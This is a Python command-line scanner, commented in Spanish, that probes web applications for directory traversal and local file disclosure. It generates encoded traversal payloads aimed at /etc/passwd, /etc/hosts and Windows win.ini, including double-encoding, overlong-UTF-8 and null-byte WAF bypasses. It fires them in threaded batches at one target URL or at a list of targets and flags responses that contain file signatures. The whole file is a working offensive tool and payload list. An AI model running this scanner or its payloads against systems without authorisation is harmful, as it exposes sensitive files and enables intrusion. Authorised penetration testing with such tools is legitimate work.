#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import urllib.parse
import sys
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)


# Rutas base en texto plano
BASE_PATHS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../etc/hosts",
    "../../../etc/hosts",
    "../../../../etc/hosts",
    "../../windows/win.ini",
    "../../../windows/win.ini",
    "../../../../windows/win.ini",
    "../../windows/system32/drivers/etc/hosts",
    "../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/system32/drivers/etc/hosts",
]


def expand_encodings(paths):
    """
    Genera variantes de encoding para cada ruta base.
    Cubre los bypasses mas habituales en bug bounty y WAFs.
    """
    result = list(paths)  # rutas originales primero

    for path in paths:
        variants = [
            # URL encoding simple: ../ -> %2e%2e%2f
            path.replace("../", "%2e%2e%2f"),
            # Doble encoding: ../ -> %252e%252e%252f
            path.replace("../", "%252e%252e%252f"),
            # Encoding mixto: ../ -> ..%2f
            path.replace("../", "..%2f"),
            # Backslash Windows: ../ -> ..\\
            path.replace("../", "..\\"),
            # Backslash URL-encoded: ../ -> ..%5c
            path.replace("../", "..%5c"),
            # Unicode / UTF-8 overlong: ../ -> ..%c0%af
            path.replace("../", "..%c0%af"),
            # Unicode dotdot: ../ -> %c0%ae%c0%ae%2f
            path.replace("../", "%c0%ae%c0%ae%2f"),
            # Doble slash: ../ -> ../
            path.replace("../", ".//"),
            # Null byte (legacy PHP/CGI): aniade %00 al final
            path + "%00",
            path + "%00.jpg",
        ]
        for v in variants:
            if v not in result:
                result.append(v)

    return result


DEFAULT_PATHS = expand_encodings(BASE_PATHS)


UNIX_SIGNATURES = [
    "root:x:0:0:",
    "/bin/bash",
    "/bin/sh",
    ":/home/",
]

WIN_SIGNATURES = [
    "[extensions]",
    "[fonts]",
    "for 16-bit app support",
    "C:\\WINDOWS\\",
]


def banner():
    print(f"{Fore.CYAN}tool-lfdscanner{Style.RESET_ALL} - Local File Disclosure & Directory Traversal scanner")
    print(f"by {Fore.GREEN}TheOffSecGirl{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Encodings activos: plain, %2e%2e%2f, doble, backslash, unicode, null byte{Style.RESET_ALL}\n")


def build_targets(args):
    targets = []

    if args.url:
        targets.append(args.url.strip())

    if args.list:
        with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)

    clean = []
    for t in targets:
        t = t.strip()
        if not t:
            continue
        if not t.startswith("http://") and not t.startswith("https://"):
            t = "http://" + t
        clean.append(t)

    if not clean:
        print(f"{Fore.RED}[!] No se han proporcionado objetivos validos.{Style.RESET_ALL}")
        sys.exit(1)

    return list(dict.fromkeys(clean))


def load_paths(args):
    paths = list(DEFAULT_PATHS)
    if args.paths:
        try:
            with open(args.paths, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if line not in paths:
                            paths.append(line)
        except OSError as e:
            print(f"{Fore.RED}[!] No se pudo leer el archivo de rutas: {e}{Style.RESET_ALL}")
    return paths


def build_url(base, param_name, path):
    if "FUZZ" in base:
        # No re-encodar: el path ya lleva su encoding especifico
        return base.replace("FUZZ", path)

    parsed = urllib.parse.urlparse(base)
    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    query[param_name] = path
    new_query = urllib.parse.urlencode(query, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urllib.parse.urlunparse(new_parsed)


def response_looks_interesting(text):
    t = text[:5000]

    for sig in UNIX_SIGNATURES:
        if sig in t:
            return True

    for sig in WIN_SIGNATURES:
        if sig in t:
            return True

    if "root:" in t and "/bin" in t:
        return True

    return False


def scan_single_request(session, url, timeout, verify, headers, path, verbose=False):
    try:
        resp = session.get(url, timeout=timeout, verify=verify, headers=headers, allow_redirects=True)
        status = resp.status_code
        body = resp.text

        if verbose:
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {url} -> {status}")

        if status in (200, 206, 500, 403) and response_looks_interesting(body):
            snippet = body[:200].replace("\n", " ").replace("\r", " ")
            return {
                "url": url,
                "status": status,
                "path": path,
                "snippet": snippet,
            }
    except requests.RequestException as e:
        if verbose:
            print(f"{Fore.YELLOW}[!] Error solicitando {url}: {e}{Style.RESET_ALL}")
    return None


def scan_target(base_url, paths, args, session, headers):
    findings = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for p in paths:
            final_url = build_url(base_url, args.param, p)
            futures.append(
                executor.submit(
                    scan_single_request,
                    session,
                    final_url,
                    args.timeout,
                    not args.insecure,
                    headers,
                    p,
                    args.verbose,
                )
            )

        for fut in as_completed(futures):
            result = fut.result()
            if result:
                findings.append(result)
                print(
                    f"{Fore.RED}[+] Posible LFD/Traversal en{Style.RESET_ALL} {result['url']}"
                )
                print(f"    path:    {result['path']}")
                print(f"    status:  {result['status']}")
                print(f"    snippet: {result['snippet']}\n")

    return findings


def parse_args():
    parser = argparse.ArgumentParser(
        description="tool-lfdscanner - Escaner de Local File Disclosure y Directory Traversal."
    )
    parser.add_argument("-u", "--url", help="URL objetivo. Puede contener FUZZ como marcador de inyeccion.")
    parser.add_argument("-L", "--list", help="Archivo con lista de objetivos (uno por linea).")
    parser.add_argument("--paths", help="Archivo con rutas de traversal personalizadas.")
    parser.add_argument("-p", "--param", default="file", help="Parametro a usar sin FUZZ (default: file).")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout por peticion en segundos (default: 5).")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Hilos por objetivo (default: 10).")
    parser.add_argument("-A", "--agent", default="Mozilla/5.0 (compatible; tool-lfdscanner)", help="User-Agent personalizado.")
    parser.add_argument("--insecure", action="store_true", help="Desactivar verificacion TLS.")
    parser.add_argument("--json-output", help="Archivo donde guardar resultados en JSON.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose.")

    args = parser.parse_args()

    if not args.url and not args.list:
        parser.error("Debes proporcionar --url o --list.")

    return args


def main():
    banner()
    args = parse_args()

    targets = build_targets(args)
    paths = load_paths(args)

    print(f"{Fore.YELLOW}[i] Rutas de prueba cargadas: {len(paths)}{Style.RESET_ALL}\n")

    headers = {"User-Agent": args.agent}
    session = requests.Session()

    all_findings = {}

    for target in targets:
        print(f"{Fore.CYAN}[*] Escaneando objetivo:{Style.RESET_ALL} {target}")
        findings = scan_target(target, paths, args, session, headers)
        all_findings[target] = findings

    total_vuln = sum(len(v) for v in all_findings.values())
    print("\n" + "-" * 60)
    print(f"{Fore.GREEN}[+] Escaneo completado.{Style.RESET_ALL}")
    print(f"    Objetivos analizados:              {len(targets)}")
    print(f"    Posibles vulnerabilidades:         {total_vuln}")

    if args.json_output:
        report = {
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "targets": all_findings,
        }
        try:
            with open(args.json_output, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            print(f"{Fore.GREEN}[+] Resultados JSON guardados en:{Style.RESET_ALL} {args.json_output}")
        except OSError as e:
            print(f"{Fore.RED}[!] No se pudo escribir el JSON: {e}{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
